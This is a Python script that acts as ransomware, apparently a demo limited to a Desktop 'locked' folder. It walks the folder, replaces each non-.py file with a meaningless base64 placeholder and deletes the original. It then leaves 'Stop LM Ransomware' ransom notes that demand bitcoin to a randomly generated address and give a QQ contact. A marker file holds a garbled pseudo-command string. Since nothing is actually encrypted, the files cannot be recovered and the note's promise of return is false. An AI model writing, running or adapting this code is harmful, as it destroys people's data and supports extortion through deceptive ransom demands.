import os,sys
import time
import random
import base64
import string
from tkinter import W
import datetime
import socket

h_name = socket.gethostname()

y_files = datetime.datetime.now()

length = 47
lower = string.ascii_lowercase
upper = string.ascii_uppercase
num = string.digits
all = lower + upper + num
temp = random.sample(all,length)
id = "".join(temp)

length_address = 34
address_gen_random = random.sample(all,length_address)
address_gen = "".join(address_gen_random)

price_bitcoin = random.randint(100,999)
price_bitcoin2 = random.randint(1000,9999)
QQ_Address = random.randint(1000000000,9999999999)
day_gen = random.randint(2,15)

username_os = os.getenv('username')
path_files = 'C:/Users/' + username_os + "/Desktop/locked"

def scan(path):
    allFiles = []
    for home, sub_files, file_list_s in os.walk(path):
        for name_files in file_list_s:
            #+------------------------------
            #Continue Files test string
            if name_files == "TestString.py":
                continue
             #Continue Files Other

            if ".py" in name_files:
                continue

            print("Loading Check Infector Files")
            if f".Infected_Rule_No_Start_In_Computer_{y_files.year}" in name_files:
                print("Check Infector Files")
                if name_files == f"Rule_No_Copy.Infected_Rule_No_Start_In_Computer_{y_files.year}_{h_name}":
                    print("Stop Infector Now")
                    exit()
            #------------------------------+
            allFiles.append(os.path.join(home, name_files))
    return allFiles

num_list = 0
openFiles = scan(path_files)
for file_os in openFiles:
     # Gen Files Name
     length_files = random.randint(10,30)
     files_name = upper + num
     gen_string = random.sample(files_name,length_files)
     files_Name_create = "".join(gen_string)

     anit_random_enc = random.randint(0,99999999999)
     Read_Data = f"No Data In Here {anit_random_enc}{price_bitcoin2}{files_Name_create}"
    
     anit_random_file = random.randint(0,999999999999999)
     files = open(file_os + ".STOP_LM_" + files_Name_create + f"_{str(anit_random_file)}", "w")
     
     encodedBytes = base64.b64encode(bytes(Read_Data, 'utf-16'))
     encodedStr = str(encodedBytes)

     files.write(encodedStr)
     files.close()

     os.remove(file_os)

     num_list += 1

     print('File',str(num_list),"Path",str(file_os))

num_list_note = 0
for dirName, subdirList, fileList in os.walk(path_files):
    num_list_note += 1
    OutputFile = os.path.join(os.path.join(dirName),f"_@Read_Me_QQ_{QQ_Address}@.txt")
    print('File ' ,str(num_list_note),f'Path File Note {(os.path.join(dirName))}')
    with open(OutputFile, "w") as  outfile:
        outfile.write(f'''---Title Note
All Your Files Have Been Lost By Stop LM Ransomware!

---Info Note
Don't worry, you can return all your files!
All your files like pictures, databases, documents and other important are Lost
The only method of recovering files is to payment!


---Info Bitcoin
How to obtain Bitcoins
The easiest way to buy bitcoins is LocalBitcoins site. You have to register, click 'Buy bitcoins', and select the seller by payment method and price.
https://localbitcoins.com/buy_bitcoins
Also you can find other places to buy Bitcoins and beginners guide here:
http://www.coindesk.com/information/how-can-i-buy-bitcoins/

--Info Price
Price will increase to ${price_bitcoin2} after {day_gen} days.
Price Now: ${price_bitcoin}
Send bitcoin at our ransom price to this address:
{address_gen}

--Info Rule
1. Do Not Restart Operation System
2. Do Not Try To Use Recovery Tools
3. Do not Repair Operation System v.Windows

--Info Files List
Target File: {str(num_list)} Files

---Info User
Contact Us:QQ-{QQ_Address}
Your personal ID:{id}

--Info Warning
Warning, this is a note, don't delete it as your files won't be recovered.
''')
    RuleFile = os.path.join(os.path.join(dirName),f"Rule_No_Copy.Infected_Rule_No_Start_In_Computer_{y_files.year}_{h_name}")
    fileNote = open(RuleFile, 'w')
    fileNote.write('Info_.bug --create --w --path Fake-Gen:http://%900%.crypto.bug.runner{$(%_{@.Test.String.Data.Date Crypto.Bug.Rule.Wait.String.String Password.Unlock} {Copy[Now]} $ String.{Rule/{Break.Ransomware}\})}/ %.date ' + f'{y_files.year}_{y_files}')
    fileNote.close()
    outfile.close()